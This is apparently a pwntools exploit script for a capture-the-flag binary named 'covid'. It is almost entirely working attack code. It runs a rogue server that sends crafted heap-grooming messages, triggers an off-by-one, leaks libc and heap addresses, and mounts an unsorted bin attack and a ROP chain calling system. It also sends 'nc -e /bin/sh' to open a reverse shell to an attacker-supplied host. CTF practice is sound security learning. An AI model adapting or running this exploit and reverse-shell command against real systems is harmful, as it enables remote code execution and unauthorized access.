#!/usr/bin/env python2

import sys,os
from pwn import *
import threading
import time

context.update(arch="amd64", endian="little", os="linux", )

LOCAL = True
HOST="covid.game.alcapwnctf.in"
PORT=41337

TARGET=os.path.realpath("covid")
LIBRARY="./libc.so.6"

EXP_HOST=""
assert EXP_HOST != ""

OVERFLOW_REQ_RECIEVED = False
OVERFLOW_REQ_FINISHED = False
DATA_STARTED = False
DATA_FINISHED = False
PAUSE_FINISHED = False

e = ELF(TARGET, False)
l = ELF(LIBRARY, False)

class Server(object):
    def __init__(self, port = 4444):
        self.messages = dict()
        self.messages[0] = {"metadata":"M"*(0x18-1), "data":"D"*(0xf8-1), "slow":False}
        self.messages[1] = {"metadata":"M"*(0x68-1), "data":"D"*(0xf8-1), "slow":False}
        self.messages[2] = {"metadata":"M"*(0x28-1), "data":"D"*(0xf8-1), "slow":False}
        self.messages[3] = {"metadata":"M"*(0x68-8)+p64(0x290), "data":"D"*(0xf8-1), "slow":False}
        self.messages[4] = {"metadata":"M"*(0x28-1), "data":"D"*0xf8+p64(0x20)+p64(0)+"D"*(0x10-1), "slow":False}
        self.messages[5] = {"metadata":"M"*(0x18-1), "data":"D"*(0x18-1), "slow":False}

        # Heap grooming messages
        self.messages[6] = {"metadata":"G"*(0x78-1), "data":"H"*(0x78-1), "slow":False}
        self.messages[7] = {"metadata":"G"*(0x78-1), "data":"H"*(0x78-1), "slow":False}
        self.messages[8] = {"metadata":"G"*(0x68)+p64(0x71)+"\x00"*(0x8-1), "data":"H"*(0x68-1), "slow":False}

        self.m_id = 0
        self.port = port
        self.slowdowntime = 5.0

        thread = threading.Thread(target=self.run, args=())
        thread2 = threading.Thread(target=self.run2, args=())

        thread.daemon = True
        thread2.daemon = True

        thread.start()
        thread2.start()

    def set_m_id(self, value):
        self.m_id = value

    def add_msg(self,key, value):
        self.messages[key] = value

    def run2(self):
        global OVERFLOW_REQ_RECIEVED
        global OVERFLOW_REQ_FINISHED

        print("Server 2 ready")
        t = listen(bindaddr = "0.0.0.0",port=8000, typ = "tcp")
        t.wait_for_connection()
        OVERFLOW_REQ_RECIEVED = True

        print("Waiting for signal to send small size")
        while True:
            if DATA_STARTED:
                print("Signal received")
                break
            else:
                time.sleep(0.25)

        t.send(p32(6)+p32(60))

        print("Waiting for signal to terminate this connection")
        while True:
            if PAUSE_FINISHED:
                print("Enter pressed, terminating connection")
                break
            else:
                time.sleep(0.25)
        t.close()
        OVERFLOW_REQ_FINISHED = True
        print("Server 2 done")


    def run(self):
        global DATA_STARTED
        global DATA_FINISHED
        while True:
            s = listen(bindaddr = "0.0.0.0",port=self.port, typ = "tcp")
            s.wait_for_connection()

            metadata = self.messages[self.m_id].get("metadata","")
            data = self.messages[self.m_id].get("data","")
            slow_data = self.messages[self.m_id].get("slow",False)

            payload = ""
            payload += p32(len(metadata))
            payload += p32(len(data))

            s.send(payload)

            payload = ""
            if slow_data:
                sleeptime = self.slowdowntime/len(metadata)
                print("Avg sleep time is {}".format(sleeptime))

                for c in metadata[:len(metadata)/2]:
                    s.send(c)
                    sleep(sleeptime)

                DATA_STARTED = True

                for c in metadata[len(metadata)/2:]:
                    s.send(c)
                    sleep(sleeptime)

                s.send(data[:-1])
                DATA_FINISHED = True
                print("Press enter now")

            else:
                payload += metadata
                payload += data
                s.send(payload)

            s.close()

s = Server()

def newtab():
    time.sleep(0.25)
    r.sendlineafter(">> ","N")
    r.sendlineafter("Hostname: ",EXP_HOST)
    r.sendlineafter("Port: ",str(4444))

def closetab(id):
    r.sendlineafter(">> ","C")
    r.sendlineafter(">> ",str(id))

def viewtab(id):
    r.sendlineafter(">> ","V")
    r.sendlineafter(">> ",str(id))

def exploit(r):
    r.recvline()
    r.sendline("nc -e /bin/sh {} 1337".format(EXP_HOST))

    newtab()
    newtab()
    raw_input("Press Enter 1/7 ")
    s.set_m_id(1)
    newtab()

    raw_input("Press Enter 2/7 ")
    s.set_m_id(2)
    newtab()

    closetab(2) #close tab to allow editing
    s.set_m_id(3)
    newtab() #New payload for off by one

    closetab(1) #close tab for free checks
    closetab(3) #close tab for overlapping chunk

    s.set_m_id(4)
    newtab() #align chunk with chunk in use

    viewtab(2)
    r.recvline()
    libcbase = u64(r.recvline().strip()+"\x00\x00")-0x3c4b78
    log.warning("libc at {}".format(hex(libcbase)))

    # Chunk overlapping for heap leak
    raw_input("Press Enter 3/7 ")
    s.set_m_id(5)
    newtab()
    closetab(3)

    viewtab(2)
    r.recvline()
    heapleak = r.recvline()[:-1]
    heapbase = u64(heapleak+"\x00"*(8-len(heapleak)))-0x220

    log.warning("heap at {}".format(hex(heapbase)))

    # Perform heap grooming for unsorted bin attack
    closetab(1) #100
    closetab(0) #120

    s.set_m_id(6)
    newtab()
    raw_input("Press Enter 4/7 ")
    s.set_m_id(7)
    newtab()
    raw_input("Press Enter 5/7 ")
    s.set_m_id(8)
    newtab()
    closetab(0)
    closetab(1)
    closetab(3)
    closetab(2)

    # Perform unsorted bin attack to write 0x7f
    FH = libcbase+0x3c678b
    UB = libcbase+0x3c4b7

    s.add_msg(9, {"metadata":"\x00"*(0x28-1), "data":p64(0)+p64(0x161)+p64(UB)+p64(FH)+"\x00"*(0x48-1), "slow":False})
    s.set_m_id(9)
    newtab()
    closetab(0)

    # Trigger Unsorted Bin attack
    s.add_msg(10,{"metadata":"U"*(0x158-1), "data":p64(heapbase+0x1a0)+"\x00"*0x60+p64(0x71)+p64(FH+0xd)[:-1], "slow":False})
    s.set_m_id(10)
    newtab()

    raw_input("Press Enter 6/7 ")
    hostname = EXP_HOST
    PUT_REQUEST_ADDR = 0x4013d9

    reqmsg = ""
    reqmsg += p32(0xffffffff) #reader fd
    reqmsg += p32(6) #writer fd
    reqmsg += p64(heapbase+0x368) #address of request buffer
    reqmsg += p64(0) #address of response buffer
    reqmsg += hostname + "\x00"*(56-len(hostname)) #hostname
    reqmsg += p32(8000) #port
    reqmsg += p32(3) #slot
    reqmsg += p32(1) #ss flag
    reqmsg += p32(0)
    reqmsg += p64(0)[:-1]

    s.add_msg(10,{"metadata":p64(PUT_REQUEST_ADDR)+"\x00"*0x5f, "data":reqmsg, "slow":False})
    s.set_m_id(10)
    newtab()

    # Trigger free to make request to server to serve fake size
    raw_input("Press Enter 7/7 ")
    POP_RDI = 0x0000000000401dd3
    SYSTEM_STRING = 0x603200
    ropchain = "\x00"*0x68
    ropchain += p64(POP_RDI)
    ropchain += p64(SYSTEM_STRING)
    ropchain += p64(libcbase+l.symbols['system'])

    s.add_msg(11, {"metadata":"\x00"*0x30, "data":ropchain+"\x00", "slow":True})
    s.set_m_id(11)
    closetab(1)
    while True:
        if OVERFLOW_REQ_RECIEVED:
            print("Fake Request recieved, sending real request")
            break
    else:
        time.sleep(0.25)

    newtab()
    global PAUSE_FINISHED
    pause()
    PAUSE_FINISHED = True

    r.interactive()
    return

if __name__ == "__main__":

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process([TARGET,])
        pause()

    exploit(r)

    sys.exit(0)
